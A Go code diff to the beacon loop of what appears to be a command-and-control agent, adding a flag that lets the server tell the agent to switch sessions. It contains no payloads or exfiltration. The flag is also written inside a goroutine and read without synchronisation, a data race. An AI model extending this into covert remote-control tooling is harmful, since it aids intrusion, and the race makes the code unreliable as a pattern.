@@ -11,20 +11,20 @@ import (
 )
 
 // Beacon is the main agent loop, responsible for periodic check-ins to the server.
-func Beacon() error {
+func Beacon() (error, bool) {
 	logger.Log("Beacon loop initiated.")
-
+	var switchSession bool
 	// Initial validation before starting the loop.
 	config.ConfigMutex.RLock()
 	if config.ID == "" {
 		config.ConfigMutex.RUnlock()
 		logger.Fatal("Beacon cannot start with an empty agent ID.")
-		return fmt.Errorf("agent ID is not set")
+		return fmt.Errorf("agent ID is not set"), false
 	}
 	if config.Timer <= 0 {
 		config.ConfigMutex.RUnlock()
 		logger.Fatal(fmt.Sprintf("Beacon cannot start with an invalid timer: %d", config.Timer))
-		return fmt.Errorf("initial timer is invalid: %d", config.Timer)
+		return fmt.Errorf("initial timer is invalid: %d", config.Timer), false
 	}
 	config.ConfigMutex.RUnlock()
 
@@ -49,15 +49,20 @@ func Beacon() error {
 			logger.Error("Beacon GET request failed: " + err.Error())
 			if retryErr := httpFuncs.RetryRequest(beaconCheckURL, 5, int(sleepDuration.Seconds())); retryErr != nil {
 				logger.Error("Beacon retries failed: " + retryErr.Error())
-				return fmt.Errorf("all beacon retries failed for %s: %w", beaconCheckURL, retryErr)
+				return fmt.Errorf("all beacon retries failed for %s: %w", beaconCheckURL, retryErr), false
 			}
 			logger.Log("Beacon retry successful.")
 		} else if responseCode == http.StatusOK {
 			logger.Log("Beacon GET successful (200 OK). Handling response.")
-			// Launch a new goroutine to handle the response without blocking the main beacon loop.
-			go HandleResponse(responseBody)
+			go func() {
+				switchSession = HandleResponse(responseBody)
+			}()
 		} else {
 			logger.Warn(fmt.Sprintf("Beacon received non-200 status: %d. No action taken.", responseCode))
+		}
+		if switchSession {
+			logger.Log("Switching session due to server request.")
+			return nil, true
 		}
 
 		// Sleep before the next beacon attempt.
